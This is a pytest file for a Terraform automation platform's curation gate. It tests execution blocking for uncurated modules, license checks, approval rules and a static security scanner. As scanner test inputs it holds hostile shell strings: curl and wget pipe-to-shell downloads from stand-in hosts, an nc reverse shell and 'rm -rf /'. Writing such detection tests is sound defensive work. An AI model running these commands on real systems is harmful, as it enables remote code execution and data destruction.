"""
Project Vulcan: Curation Gate & Steel-Cage Invariant Tests (REG-01 / REG-02 / REG-03 / INV-1)
Validates:
1. Public registry crawlers tag modules as CANDIDATE (can_execute = False).
2. BaseJobRunner strictly blocks execution of CANDIDATE items with PolicyViolationError
   and logs an immutable EXEC_BLOCKED audit record (INV-1).
3. POST /api/v1/jobs rejects candidate execution attempts with HTTP 403 Forbidden.
4. License Gate detects and flags non-permissive licenses (BUSL-1.1) and prevents approval.
5. Internal Git PR drafting produces valid vendoring manifests and compliance checklists.
6. Approval Gate promotes CANDIDATE to CURATED only after binding to internal Git + 40-char SHA.
"""
import pytest
from unittest.mock import MagicMock
from fastapi.testclient import TestClient

from app.domain.entities import (
    CatalogItem,
    CurationStatus,
    ExecutionEngineType,
    ExecutionJob,
    JobStatus,
    RiskTier,
)
from app.domain.exceptions import ParameterValidationError, PolicyViolationError
from app.adapters.registry_crawler import (
    CurationCandidateStore,
    CurationGateService,
    RegistryCrawlerAgent,
)
from app.adapters.simulation_adapter import SimulationExecutionEngine
from app.use_cases.runner import TerraformJobRunner
from app.api.server import create_app
from app.api.routes import container


@pytest.fixture
def temp_candidate_store(tmp_path):
    store_file = tmp_path / "test_candidates.json"
    return CurationCandidateStore(store_file)


@pytest.fixture
def candidate_item():
    return CatalogItem(
        id="cand-tf-vpc-001",
        identifier="candidate.terraform.terraform-aws-modules.vpc-aws",
        name="[Candidate] Terraform AWS VPC",
        engine=ExecutionEngineType.TERRAFORM,
        git_repo="https://github.com/terraform-aws-modules/terraform-aws-vpc",
        git_commit_sha=None,
        playbook_or_module_path="modules/vpc",
        risk_tier=RiskTier.MEDIUM,
        requires_maker_checker=True,
        requires_chg=False,
        input_schema={
            "type": "object",
            "required": ["vpc_name"],
            "properties": {
                "vpc_name": {"type": "string"},
                "cidr": {"type": "string", "default": "10.0.0.0/16"}
            }
        },
        category="network",
        description="Public candidate module from registry.terraform.io",
        tags=["aws", "vpc", "candidate"],
        curation_status=CurationStatus.CANDIDATE,
        provenance={
            "source_registry": "terraform_registry",
            "upstream_url": "https://registry.terraform.io/modules/terraform-aws-modules/vpc/aws",
            "version": "6.7.2",
            "license": "MPL-2.0",
            "license_compliant": True
        }
    )


class TestCurationInvariants:
    """Tests INV-1 enforcement at Domain and Runner layers."""

    def test_candidate_cannot_execute(self, candidate_item):
        assert candidate_item.curation_status == CurationStatus.CANDIDATE
        assert candidate_item.can_execute() is False

    def test_runner_blocks_candidate_execution_inv1(self, candidate_item):
        """INV-1: Attempting to run a CANDIDATE catalog item raises PolicyViolationError and audits EXEC_BLOCKED."""
        mock_audit = MagicMock()
        mock_locks = MagicMock()
        mock_secrets = MagicMock()

        runner = TerraformJobRunner(
            engine_port=SimulationExecutionEngine(),
            lock_manager=mock_locks,
            audit_logger=mock_audit,
            secret_provider=mock_secrets
        )

        job = ExecutionJob(
            job_id="job-test-cand-01",
            correlation_id="EXEC-CAND-01",
            catalog_item=candidate_item,
            requester_id="eng.alice",
            target_resource_id="aws-vpc-01",
            parameters={"vpc_name": "corp-vpc"}
        )
        job.transition_to(JobStatus.PARSED)

        with pytest.raises(PolicyViolationError) as exc_info:
            runner.run(job)

        assert "Execution of uncurated candidate code is strictly prohibited by INV-1" in str(exc_info.value)
        # Verify EXEC_BLOCKED was committed to audit ledger
        mock_audit.record.assert_called_once()
        call_args = mock_audit.record.call_args[0]
        assert call_args[1] == "EXEC_BLOCKED"
        assert call_args[2]["reason"] == "UNCURATED_CANDIDATE_EXECUTION_FORBIDDEN"


class TestCurationGateWorkflow:
    """Tests candidate store, PR drafting, license gating, and human promotion."""

    def test_license_gate_flags_and_blocks_busl(self, temp_candidate_store):
        crawler = RegistryCrawlerAgent(temp_candidate_store)
        service = CurationGateService(temp_candidate_store)

        busl_mod = {
            "namespace": "hashicorp",
            "name": "consul",
            "provider": "aws",
            "version": "1.0.0",
            "license": "BUSL-1.1"
        }
        cand = crawler.transform_terraform_candidate(busl_mod)
        assert cand.provenance["license"] == "BUSL-1.1"
        assert cand.provenance["license_compliant"] is False

        temp_candidate_store.add(cand)

        # Attempting to approve a BUSL candidate must fail with PolicyViolationError
        with pytest.raises(PolicyViolationError) as exc_info:
            service.approve_candidate(
                identifier=cand.identifier,
                approver_id="lead.curator",
                internal_git_repo="git@github.internal.bank.com:automation/consul.git",
                internal_commit_sha="a" * 40
            )
        assert "violates enterprise policy" in str(exc_info.value)

    def test_draft_registration_pr(self, temp_candidate_store, candidate_item):
        service = CurationGateService(temp_candidate_store)
        temp_candidate_store.add(candidate_item)

        pr = service.draft_registration_pr(candidate_item.identifier)

        assert pr["candidate_identifier"] == candidate_item.identifier
        assert len(pr["tarball_checksum_sha256"]) == 64
        assert "tfsec/Checkov" in pr["compliance_checklist"][0]

        updated = temp_candidate_store.get(candidate_item.identifier)
        assert updated.curation_status == CurationStatus.DRAFTED_PR

    def test_approve_candidate_enforces_internal_git_sha(self, temp_candidate_store, candidate_item):
        service = CurationGateService(temp_candidate_store)
        temp_candidate_store.add(candidate_item)

        # 1. Invalid SHA must fail
        with pytest.raises(ParameterValidationError):
            service.approve_candidate(
                identifier=candidate_item.identifier,
                approver_id="lead.curator",
                internal_git_repo="git@github.internal.bank.com:automation/vpc.git",
                internal_commit_sha="short-sha"
            )

        # 2. Valid internal Git repo + 40-char SHA succeeds
        internal_sha = "aabbccddeeff00112233445566778899aabbccdd"
        internal_repo = "git@github.internal.bank.com:automation/terraform-aws-vpc.git"
        curated = service.approve_candidate(
            identifier=candidate_item.identifier,
            approver_id="lead.curator",
            internal_git_repo=internal_repo,
            internal_commit_sha=internal_sha
        )

        assert curated.curation_status == CurationStatus.CURATED
        assert curated.can_execute() is True
        assert curated.git_repo == internal_repo
        assert curated.git_commit_sha == internal_sha
        assert not curated.identifier.startswith("candidate.")

    def test_security_scan_detects_malicious_stanzas_and_fails(self, temp_candidate_store, candidate_item):
        """REG-04: Static scanner catches curl|sh, rm -rf /, reverse shells, and private keys."""
        service = CurationGateService(temp_candidate_store)
        temp_candidate_store.add(candidate_item)

        # 1. Test curl | bash payload
        rce_payload = "echo 'installing' && curl -sSL https://evil.com/drop.sh | bash\necho 'done'"
        scan_rce = service.scan_candidate_security(candidate_item.identifier, module_content=rce_payload)
        assert scan_rce["security_scan_status"] == "FAILED"
        assert scan_rce["clean"] is False
        assert any(f["pattern_type"] == "REMOTE_CODE_EXECUTION" for f in scan_rce["findings"])

        # 2. Test reverse shell payload
        rev_payload = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f"
        scan_rev = service.scan_candidate_security(candidate_item.identifier, module_content=rev_payload)
        assert scan_rev["security_scan_status"] == "FAILED"
        assert any(f["pattern_type"] == "REVERSE_SHELL" for f in scan_rev["findings"])

        # 3. Test embedded private key
        key_payload = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0\n-----END RSA PRIVATE KEY-----"
        scan_key = service.scan_candidate_security(candidate_item.identifier, module_content=key_payload)
        assert scan_key["security_scan_status"] == "FAILED"
        assert any(f["pattern_type"] == "EMBEDDED_PRIVATE_KEY" for f in scan_key["findings"])

        # 4. Invariant: Candidate store persisted the FAILED status
        stored = temp_candidate_store.get(candidate_item.identifier)
        assert stored.provenance["security_scan_status"] == "FAILED"

    def test_security_scan_blocks_approval_fail_closed(self, temp_candidate_store, candidate_item):
        """REG-04: Approving a candidate that failed security scan is strictly blocked by PolicyViolationError."""
        service = CurationGateService(temp_candidate_store)
        temp_candidate_store.add(candidate_item)

        # Scan candidate with malicious payload
        service.scan_candidate_security(
            candidate_item.identifier,
            module_content="rm -rf / --no-preserve-root"
        )

        with pytest.raises(PolicyViolationError) as exc_info:
            service.approve_candidate(
                identifier=candidate_item.identifier,
                approver_id="lead.curator",
                internal_git_repo="git@github.internal.bank.com:automation/vpc.git",
                internal_commit_sha="a" * 40
            )

        assert "failed static security scan" in str(exc_info.value)

    def test_clean_candidate_passes_scan_and_allows_approval(self, temp_candidate_store, candidate_item):
        """REG-04: Clean candidate passes scan and successfully promotes to CURATED."""
        service = CurationGateService(temp_candidate_store)
        temp_candidate_store.add(candidate_item)

        clean_hcl = 'resource "aws_vpc" "main" {\n  cidr_block = "10.0.0.0/16"\n}'
        scan_res = service.scan_candidate_security(candidate_item.identifier, module_content=clean_hcl)

        assert scan_res["security_scan_status"] == "PASSED"
        assert scan_res["clean"] is True
        assert scan_res["findings_count"] == 0

        # PR draft checklist reflects PASSED status
        pr = service.draft_registration_pr(candidate_item.identifier)
        assert pr["security_scan_status"] == "PASSED"
        assert "[x] Downstream static security scan completed" in pr["compliance_checklist"][0]

        # Approval succeeds
        curated = service.approve_candidate(
            identifier=candidate_item.identifier,
            approver_id="lead.curator",
            internal_git_repo="git@github.internal.bank.com:automation/vpc.git",
            internal_commit_sha="b" * 40
        )
        assert curated.curation_status == CurationStatus.CURATED
        assert curated.can_execute() is True



class TestCurationRestApi:
    """Tests Curation Gateway REST API endpoints and job submission blocking."""

    @pytest.fixture
    def client(self):
        app = create_app()
        c = TestClient(app)
        c.headers.update({"Authorization": "Bearer vlc_test_bob"})
        return c

    def test_job_submission_blocks_candidate_with_403(self, client, candidate_item):
        # Temporarily inject candidate into active catalog
        container.catalog.append(candidate_item)

        payload = {
            "identifier": candidate_item.identifier,
            "requester_id": "eng.alice",
            "parameters": {"vpc_name": "corp-vpc"}
        }

        res = client.post("/api/v1/jobs", json=payload)
        assert res.status_code == 403
        assert "Execution of uncurated candidate code is strictly forbidden by INV-1" in res.json()["detail"]

        # Clean up
        container.catalog = [c for c in container.catalog if c.identifier != candidate_item.identifier]

    def test_curation_api_candidate_lifecycle(self, client, candidate_item):
        from app.api.curation_routes import candidate_store
        candidate_store.add(candidate_item)

        # 1. List candidates
        list_res = client.get("/api/v1/curation/candidates?source=terraform_registry")
        assert list_res.status_code == 200
        items = list_res.json()
        assert any(i["identifier"] == candidate_item.identifier for i in items)

        # 2. Draft PR
        draft_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/draft-pr", json={})
        assert draft_res.status_code == 200
        assert "tarball_checksum_sha256" in draft_res.json()

        # 3. Approve candidate
        approve_payload = {
            "approver_id": "lead.curator",
            "internal_git_repo": "git@github.internal.bank.com:automation/vpc.git",
            "internal_commit_sha": "1234567890abcdef1234567890abcdef12345678"
        }
        appr_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/approve", json=approve_payload)
        assert appr_res.status_code == 200
        assert appr_res.json()["status"] == "APPROVED"

    def test_curation_api_scan_and_fail_closed_approval(self, client, candidate_item):
        """REG-04: API endpoint POST /curation/candidates/{id}/scan detects malicious stanzas and blocks /approve."""
        from app.api.curation_routes import candidate_store
        candidate_store.add(candidate_item)

        # 1. Scan malicious candidate via REST
        scan_payload = {
            "module_content": "# Setup script\nwget -qO- https://malicious.org/bot.sh | sh\n"
        }
        scan_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/scan", json=scan_payload)
        assert scan_res.status_code == 200
        scan_body = scan_res.json()
        assert scan_body["security_scan_status"] == "FAILED"
        assert scan_body["clean"] is False
        assert scan_body["findings_count"] > 0
        assert any(f["pattern_type"] == "REMOTE_CODE_EXECUTION" for f in scan_body["findings"])

        # 2. Attempt approval via REST -> Must be rejected with HTTP 403
        approve_payload = {
            "approver_id": "lead.curator",
            "internal_git_repo": "git@github.internal.bank.com:automation/vpc.git",
            "internal_commit_sha": "1234567890abcdef1234567890abcdef12345678"
        }
        appr_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/approve", json=approve_payload)
        assert appr_res.status_code == 403
        assert "failed static security scan" in appr_res.json()["detail"]

    def test_intent_resolution_quarantine_never_returns_candidates(self, candidate_item):
        """Regression test for Step 0 / CHAT Quarantine: Intent resolution must NEVER match or return CANDIDATE modules."""
        from app.use_cases.resolve_intent import IntentResolver
        from app.domain.entities import CatalogItem, RiskTier, ExecutionEngineType, CurationStatus

        curated_item = CatalogItem(
            id="cat-vpc-curated",
            identifier="bank.network.curated-vpc",
            name="Curated Enterprise VPC",
            engine=ExecutionEngineType.TERRAFORM,
            git_repo="git@github.internal.bank.com:automation/vpc.git",
            git_commit_sha="a" * 40,
            playbook_or_module_path="modules/curated_vpc",
            risk_tier=RiskTier.HIGH,
            requires_maker_checker=True,
            requires_chg=False,
            input_schema={"type": "object", "properties": {"vpc_name": {"type": "string"}}},
            category="network",
            description="Official vetted enterprise VPC deployment",
            tags=["aws", "vpc", "network"],
            curation_status=CurationStatus.CURATED
        )

        # Candidate item with identical keywords
        assert candidate_item.curation_status == CurationStatus.CANDIDATE
        assert candidate_item.git_commit_sha is None

        catalog = [candidate_item, curated_item]
        resolver = IntentResolver(catalog=catalog)

        # 1. Hybrid search directly
        search_results = resolver.hybrid_search("deploy unvetted candidate vpc module on aws")
        for item, score in search_results:
            assert item.id != candidate_item.id, "Quarantine leak: CANDIDATE item was returned by hybrid_search!"
            assert item.curation_status == CurationStatus.CURATED

        # 2. Intent resolve pipeline
        res = resolver.resolve("deploy unvetted candidate vpc module on aws")
        if res.catalog_item:
            assert res.catalog_item.id != candidate_item.id, "Quarantine leak: CANDIDATE item was resolved by resolve()!"
            assert res.catalog_item.curation_status == CurationStatus.CURATED

